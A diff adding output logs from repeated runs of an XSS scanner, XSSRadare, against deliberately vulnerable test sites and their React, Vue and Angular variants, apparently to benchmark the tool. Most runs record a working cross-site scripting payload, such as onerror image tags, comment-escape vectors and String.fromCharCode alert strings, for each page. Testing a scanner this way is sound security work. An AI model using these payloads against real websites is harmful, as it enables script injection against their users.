@@ -1,0 +1,432 @@
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Tue Jun 29 16:40:21 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[32m[+] XSS Found on https://xss-suite-test-site.herokuapp.com/pages/simple_tag.php with params xss=<img+src=1+href=1+onerror="javascript:alert(1)"></img>[0m
+[33m[+] Stopping the scan after first result as required ..[0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Tue Jun 29 16:40:55 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[32m[+] XSS Found on https://xss-suite-test-site.herokuapp.com/pages/simple_value.php with params xss=<!--<img+src="--><img+src=x+onerror=javascript:alert(1)//">[0m
+[33m[+] Stopping the scan after first result as required ..[0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Tue Jun 29 16:57:24 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[32m[+] XSS Found on https://xss-suite-test-site.herokuapp.com/pages/simple_comment.php with params xss=--><!--+--->+<img+src=xxx:x+onerror=javascript:alert(1)>+-->[0m
+[33m[+] Stopping the scan after first result as required ..[0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Tue Jun 29 17:02:03 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[32m[+] XSS Found on https://xss-suite-test-site.herokuapp.com/pages/simple_innerHTML.php with params xss=<img+src=1+href=1+onerror="javascript:alert(1)"></img>[0m
+[33m[+] Stopping the scan after first result as required ..[0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Tue Jun 29 17:02:38 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[32m[+] XSS Found on https://xss-suite-test-site.herokuapp.com/pages/delayed_innerHTML.php with params xss=<object+src=1+href=1+onerror="javascript:alert(1)"></object>[0m
+[33m[+] Stopping the scan after first result as required ..[0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Tue Jun 29 17:03:29 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[34m[+] Scan finished , number of found XSS : 0 [0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Tue Jun 29 17:40:10 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[32m[+] XSS Found on https://xss-suite-test-site.herokuapp.com/pages/simple_eval.php with params xss=';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";[0m
+[33m[+] Stopping the scan after first result as required ..[0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Tue Jun 29 18:06:22 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[34m[+] Scan finished , number of found XSS : 0 [0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Tue Jun 29 18:43:42 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[34m[+] Scan finished , number of found XSS : 0 [0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Tue Jun 29 19:20:47 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[34m[+] Scan finished , number of found XSS : 0 [0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Tue Jun 29 19:59:07 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[32m[+] XSS Found on https://xss-suite-test-site.herokuapp.com/pages/escaping_onload.php with params xss=';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";[0m
+[33m[+] Stopping the scan after first result as required ..[0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Tue Jun 29 20:27:14 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[32m[+] XSS Found on https://xss-suite-test-site.herokuapp.com/pages/script_single_quote_text.php with params xss=';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";[0m
+[33m[+] Stopping the scan after first result as required ..[0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Tue Jun 29 20:53:35 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[32m[+] XSS Found on https://xss-suite-test-site.herokuapp.com/pages/script_double_quote_text.php with params xss=alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--[0m
+[33m[+] Stopping the scan after first result as required ..[0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Tue Jun 29 21:20:00 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[34m[+] Scan finished , number of found XSS : 0 [0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Tue Jun 29 21:57:25 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[34m[+] Scan finished , number of found XSS : 0 [0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Tue Jun 29 22:34:00 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[32m[+] XSS Found on https://react-xss-suite-test-site.herokuapp.com/simpleTag with params xss=<img+src=1+href=1+onerror="javascript:alert(1)"></img>[0m
+[33m[+] Stopping the scan after first result as required ..[0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Tue Jun 29 22:35:13 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[32m[+] XSS Found on https://react-xss-suite-test-site.herokuapp.com/simpleValue with params xss=<!--<img+src="--><img+src=x+onerror=javascript:alert(1)//">[0m
+[33m[+] Stopping the scan after first result as required ..[0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Tue Jun 29 22:55:48 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[32m[+] XSS Found on https://react-xss-suite-test-site.herokuapp.com/simpleComment with params xss=--><!--+--->+<img+src=xxx:x+onerror=javascript:alert(1)>+-->[0m
+[33m[+] Stopping the scan after first result as required ..[0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Tue Jun 29 23:01:18 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[34m[+] Scan finished , number of found XSS : 0 [0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Tue Jun 29 23:47:10 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[34m[+] Scan finished , number of found XSS : 0 [0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Wed Jun 30 00:32:52 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[34m[+] Scan finished , number of found XSS : 0 [0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Wed Jun 30 01:19:00 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[34m[+] Scan finished , number of found XSS : 0 [0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Wed Jun 30 02:04:00 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[32m[+] XSS Found on https://react-xss-suite-test-site.herokuapp.com/escapingOnload with params xss=';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";[0m
+[33m[+] Stopping the scan after first result as required ..[0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Wed Jun 30 02:36:02 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[32m[+] XSS Found on https://vue-xss-suite-test-site.herokuapp.com/simpleTag with params xss=<img+src=1+href=1+onerror="javascript:alert(1)"></img>[0m
+[33m[+] Stopping the scan after first result as required ..[0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Wed Jun 30 02:36:44 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[32m[+] XSS Found on https://vue-xss-suite-test-site.herokuapp.com/simpleValue with params xss=<!--<img+src="--><img+src=x+onerror=javascript:alert(1)//">[0m
+[33m[+] Stopping the scan after first result as required ..[0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Wed Jun 30 02:54:58 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[32m[+] XSS Found on https://vue-xss-suite-test-site.herokuapp.com/simpleComment with params xss=--><!--+--->+<img+src=xxx:x+onerror=javascript:alert(1)>+-->[0m
+[33m[+] Stopping the scan after first result as required ..[0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Wed Jun 30 02:59:58 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[34m[+] Scan finished , number of found XSS : 0 [0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Wed Jun 30 03:41:58 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[34m[+] Scan finished , number of found XSS : 0 [0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Wed Jun 30 04:23:06 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[34m[+] Scan finished , number of found XSS : 0 [0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Wed Jun 30 05:05:19 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[34m[+] Scan finished , number of found XSS : 0 [0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Wed Jun 30 05:46:43 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+Traceback (most recent call last):
+  File "XSSRadare.py", line 218, in <module>
+    fuzz_get_urls(url)
+  File "XSSRadare.py", line 185, in fuzz_get_urls
+    browser.get(url_to_send)
+  File "/usr/local/lib/python3.8/dist-packages/selenium/webdriver/remote/webdriver.py", line 333, in get
+    self.execute(Command.GET, {'url': url})
+  File "/usr/local/lib/python3.8/dist-packages/selenium/webdriver/remote/webdriver.py", line 321, in execute
+    self.error_handler.check_response(response)
+  File "/usr/local/lib/python3.8/dist-packages/selenium/webdriver/remote/errorhandler.py", line 242, in check_response
+    raise exception_class(message, screen, stacktrace)
+selenium.common.exceptions.TimeoutException: Message: TimedPromise timed out after 300000 ms
+
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Wed Jun 30 06:10:33 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[32m[+] XSS Found on https://angular-xss-suite-test-site.herokuapp.com/simpleTag with params xss=<img+src=1+href=1+onerror="javascript:alert(1)"></img>[0m
+[33m[+] Stopping the scan after first result as required ..[0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Wed Jun 30 06:11:44 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[32m[+] XSS Found on https://angular-xss-suite-test-site.herokuapp.com/simpleValue with params xss=<!--<img+src="--><img+src=x+onerror=javascript:alert(1)//">[0m
+[33m[+] Stopping the scan after first result as required ..[0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Wed Jun 30 06:35:53 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[32m[+] XSS Found on https://angular-xss-suite-test-site.herokuapp.com/simpleComment with params xss=--><!--+--->+<img+src=xxx:x+onerror=javascript:alert(1)>+-->[0m
+[33m[+] Stopping the scan after first result as required ..[0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Wed Jun 30 06:42:31 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[34m[+] Scan finished , number of found XSS : 0 [0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Wed Jun 30 07:35:24 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[34m[+] Scan finished , number of found XSS : 0 [0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Wed Jun 30 08:25:47 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[34m[+] Scan finished , number of found XSS : 0 [0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Wed Jun 30 09:16:37 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[34m[+] Scan finished , number of found XSS : 0 [0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Wed Jun 30 10:08:38 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[34m[+] Scan finished , number of found XSS : 0 [0m
+
+ __  _____ ___ ___         _              
+ \ \/ / __/ __| _ \__ _ __| |__ _ _ _ ___
+  >  <\__ \__ \   / _` / _` / _` | '_/ -_)
+ /_/\_\___/___/_|_\__,_\__,_\__,_|_| \___|
+
+[+] XSSRadare Start working at : Wed Jun 30 10:57:34 2021
+
+Using payloads from file 666_lines_of_XSS_vectors.txt
+[32m[+] XSS Found on https://angular-xss-suite-test-site.herokuapp.com/escapingOnLoad with params xss=';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";[0m
+[33m[+] Stopping the scan after first result as required ..[0m
